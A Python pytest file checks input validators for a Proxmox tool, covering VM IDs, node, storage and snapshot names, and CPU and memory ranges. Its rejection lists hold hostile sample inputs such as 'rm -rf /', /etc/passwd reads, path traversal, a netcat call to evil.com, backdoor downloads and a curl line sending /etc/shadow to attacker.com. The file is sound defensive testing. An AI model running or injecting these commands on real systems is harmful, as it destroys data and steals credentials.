"""Tests for Proxmox validation utilities."""

import pytest
from src.utils.validation import (
    is_valid_vmid,
    is_valid_node_name,
    is_valid_storage_name,
    validate_snapshot_name,
    validate_cores_range,
    validate_memory_range
)


class TestVMIDValidation:
    """Test VMID validation."""
    
    def test_valid_vmids(self):
        """Test valid VMIDs."""
        valid_vmids = [
            100,  # Minimum valid VMID
            999999,  # Maximum valid VMID
            "100",  # String representation
            "12345",  # Mid-range
            1000,
            50000
        ]
        
        for vmid in valid_vmids:
            assert is_valid_vmid(vmid) is True, f"Expected VMID '{vmid}' to be valid"
    
    def test_invalid_vmids(self):
        """Test invalid VMIDs."""
        invalid_vmids = [
            0,  # Too small
            99,  # Below minimum
            1000000,  # Above maximum
            -1,  # Negative
            "not-a-number",  # Not numeric
            "100; rm -rf /",  # Injection attempt
            "100 && reboot",  # Command injection
            "",  # Empty string
            None,  # None
            [],  # List
            {},  # Dict
            "100`whoami`",  # Command injection
            "100$(id)"  # Command injection
        ]
        
        for vmid in invalid_vmids:
            assert is_valid_vmid(vmid) is False, f"Expected VMID '{vmid}' to be invalid"
    
    def test_vmid_range_boundaries(self):
        """Test VMID range boundaries."""
        # Just below valid range
        assert is_valid_vmid(99) is False
        # Start of valid range
        assert is_valid_vmid(100) is True
        # End of valid range
        assert is_valid_vmid(999999) is True
        # Just above valid range
        assert is_valid_vmid(1000000) is False


class TestNodeNameValidation:
    """Test node name validation."""
    
    def test_valid_node_names(self):
        """Test valid node names."""
        valid_names = [
            "pve",
            "node1",
            "proxmox-host",
            "server_01",
            "MyNode",
            "node-123",
            "test_node"
        ]
        
        for name in valid_names:
            assert is_valid_node_name(name) is True, f"Expected node name '{name}' to be valid"
    
    def test_invalid_node_names_with_injection(self):
        """Test invalid node names with injection attempts."""
        invalid_names = [
            "",  # Empty
            None,  # None
            123,  # Not a string
            "node; rm -rf /",  # Command injection
            "node && reboot",  # Command injection
            "node | cat /etc/passwd",  # Command injection
            "node`whoami`",  # Command injection
            "node$(id)",  # Command injection
            "../../../etc/passwd",  # Path traversal
            "node/../../../etc",  # Path traversal
            "node with spaces",  # Spaces not allowed
            "node.with.dots",  # Dots not allowed
            "node/with/slashes",  # Slashes not allowed
            "node\\with\\backslashes",  # Backslashes not allowed
            "node@host",  # Special chars not allowed
            "node#123",  # Special chars not allowed
        ]
        
        for name in invalid_names:
            assert is_valid_node_name(name) is False, f"Expected node name '{name}' to be invalid"


class TestStorageNameValidation:
    """Test storage name validation."""
    
    def test_valid_storage_names(self):
        """Test valid storage names."""
        valid_names = [
            "local",
            "local-lvm",
            "nfs_storage",
            "ceph-pool",
            "storage1",
            "my-storage",
            "STORAGE"
        ]
        
        for name in valid_names:
            assert is_valid_storage_name(name) is True, f"Expected storage name '{name}' to be valid"
    
    def test_invalid_storage_names(self):
        """Test invalid storage names with injection attempts."""
        invalid_names = [
            "",  # Empty
            None,  # None
            123,  # Not a string
            "storage; rm -rf /",  # Command injection
            "storage && wget evil.com/backdoor",  # Command injection
            "storage | nc evil.com 1234",  # Command injection
            "storage`id`",  # Command injection
            "storage$(whoami)",  # Command injection
            "../../../etc/storage",  # Path traversal
            "storage/../../../etc",  # Path traversal
            "storage with spaces",  # Spaces not allowed
            "storage.name",  # Dots not allowed
            "storage/path",  # Slashes not allowed
            "storage\\path",  # Backslashes not allowed
        ]
        
        for name in invalid_names:
            assert is_valid_storage_name(name) is False, f"Expected storage name '{name}' to be invalid"


class TestValidationIntegration:
    """Test validation in context of API calls."""
    
    def test_vm_operation_parameters(self):
        """Test typical VM operation parameters."""
        # Valid VM operation
        node = "pve"
        vmid = "100"
        
        assert is_valid_node_name(node) is True
        assert is_valid_vmid(vmid) is True
        
        # Invalid VM operation (injection attempt)
        malicious_node = "pve; rm -rf /"
        malicious_vmid = "100`id`"
        
        assert is_valid_node_name(malicious_node) is False
        assert is_valid_vmid(malicious_vmid) is False
    
    def test_storage_operation_parameters(self):
        """Test typical storage operation parameters."""
        # Valid storage operation
        node = "pve"
        storage = "local-lvm"
        
        assert is_valid_node_name(node) is True
        assert is_valid_storage_name(storage) is True
        
        # Invalid storage operation (path traversal)
        malicious_storage = "../../../etc/storage"
        
        assert is_valid_storage_name(malicious_storage) is False
    
    def test_snapshot_operation_parameters(self):
        """Test typical snapshot operation parameters."""
        # Valid snapshot operation
        node = "proxmox-1"
        vmid = 12345
        snapname = "pre-update"
        
        assert is_valid_node_name(node) is True
        assert is_valid_vmid(vmid) is True
        # snapname would need its own validator if we add one
        
        # Invalid snapshot operation
        malicious_node = "node && reboot"
        
        assert is_valid_node_name(malicious_node) is False


class TestSecurityScenarios:
    """Test specific security attack scenarios."""
    
    def test_command_injection_prevention(self):
        """Test that common command injection patterns are blocked."""
        command_injection_patterns = [
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| nc evil.com 1234",
            "`whoami`",
            "$(id)",
            "; reboot",
            "&& wget http://evil.com/backdoor.sh",
            "|| curl http://attacker.com/exfil?data=$(cat /etc/shadow)"
        ]
        
        for pattern in command_injection_patterns:
            test_input = f"node{pattern}"
            assert is_valid_node_name(test_input) is False, \
                f"Command injection pattern should be blocked: {pattern}"
    
    def test_path_traversal_prevention(self):
        """Test that path traversal patterns are blocked."""
        path_traversal_patterns = [
            "../",
            "../../",
            "../../../etc/passwd",
            "..\\..\\windows",
            "/etc/passwd",
            "\\windows\\system32"
        ]
        
        for pattern in path_traversal_patterns:
            assert is_valid_node_name(pattern) is False, \
                f"Path traversal pattern should be blocked: {pattern}"
            assert is_valid_storage_name(pattern) is False, \
                f"Path traversal pattern should be blocked: {pattern}"


class TestSnapshotNameValidation:
    """Test snapshot name validation."""
    
    def test_valid_snapshot_names(self):
        """Test valid snapshot names."""
        valid_names = [
            "snapshot1",
            "before-update",
            "backup_2024",
            "pre-upgrade",
            "test_snapshot",
            "SNAPSHOT",
            "snapshot-123_test"
        ]
        
        for name in valid_names:
            assert validate_snapshot_name(name) is True, f"Expected snapshot name '{name}' to be valid"
    
    def test_invalid_snapshot_names(self):
        """Test invalid snapshot names with injection attempts."""
        invalid_names = [
            "",  # Empty
            None,  # None
            123,  # Not a string
            "snapshot; rm -rf /",  # Command injection
            "snapshot && reboot",  # Command injection
            "snapshot | cat /etc/passwd",  # Command injection
            "snapshot`whoami`",  # Command injection
            "snapshot$(id)",  # Command injection
            "../../../etc/passwd",  # Path traversal
            "snapshot/../../../etc",  # Path traversal
            "snapshot with spaces",  # Spaces not allowed
            "snapshot.with.dots",  # Dots not allowed
            "snapshot/with/slashes",  # Slashes not allowed
            "snapshot\\with\\backslashes",  # Backslashes not allowed
            "snapshot@host",  # Special chars not allowed
            "snapshot#123",  # Special chars not allowed
            "a" * 150,  # Too long
        ]
        
        for name in invalid_names:
            assert validate_snapshot_name(name) is False, f"Expected snapshot name '{name}' to be invalid"


class TestCoresRangeValidation:
    """Test CPU cores range validation."""
    
    def test_valid_cores(self):
        """Test valid CPU cores values."""
        valid_cores = [1, 2, 4, 8, 16, 32, 64, 128, "1", "64", "128"]
        
        for cores in valid_cores:
            assert validate_cores_range(cores) is True, f"Expected cores '{cores}' to be valid"
    
    def test_invalid_cores(self):
        """Test invalid CPU cores values."""
        invalid_cores = [
            0,  # Too small
            -1,  # Negative
            129,  # Too large
            1000,  # Way too large
            "not-a-number",  # Not numeric
            "8; rm -rf /",  # Injection attempt
            "",  # Empty string
            None,  # None
            [],  # List
            {},  # Dict
        ]
        
        for cores in invalid_cores:
            assert validate_cores_range(cores) is False, f"Expected cores '{cores}' to be invalid"
    
    def test_cores_boundaries(self):
        """Test CPU cores boundary values."""
        assert validate_cores_range(0) is False  # Below minimum
        assert validate_cores_range(1) is True   # Minimum
        assert validate_cores_range(128) is True # Maximum
        assert validate_cores_range(129) is False # Above maximum


class TestMemoryRangeValidation:
    """Test memory range validation."""
    
    def test_valid_memory(self):
        """Test valid memory values."""
        valid_memory = [
            64,      # Minimum
            512,     # Common
            1024,    # 1GB
            2048,    # 2GB
            4096,    # 4GB
            8192,    # 8GB
            16384,   # 16GB
            1048576, # Maximum (1TB)
            "512",
            "1024",
            "8192"
        ]
        
        for memory in valid_memory:
            assert validate_memory_range(memory) is True, f"Expected memory '{memory}' to be valid"
    
    def test_invalid_memory(self):
        """Test invalid memory values."""
        invalid_memory = [
            0,  # Too small
            63,  # Below minimum
            -1,  # Negative
            1048577,  # Above maximum (1TB + 1)
            10000000,  # Way too large
            "not-a-number",  # Not numeric
            "512; rm -rf /",  # Injection attempt
            "",  # Empty string
            None,  # None
            [],  # List
            {},  # Dict
        ]
        
        for memory in invalid_memory:
            assert validate_memory_range(memory) is False, f"Expected memory '{memory}' to be invalid"
    
    def test_memory_boundaries(self):
        """Test memory boundary values."""
        assert validate_memory_range(63) is False      # Below minimum
        assert validate_memory_range(64) is True       # Minimum (64MB)
        assert validate_memory_range(1048576) is True  # Maximum (1TB)
        assert validate_memory_range(1048577) is False # Above maximum


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
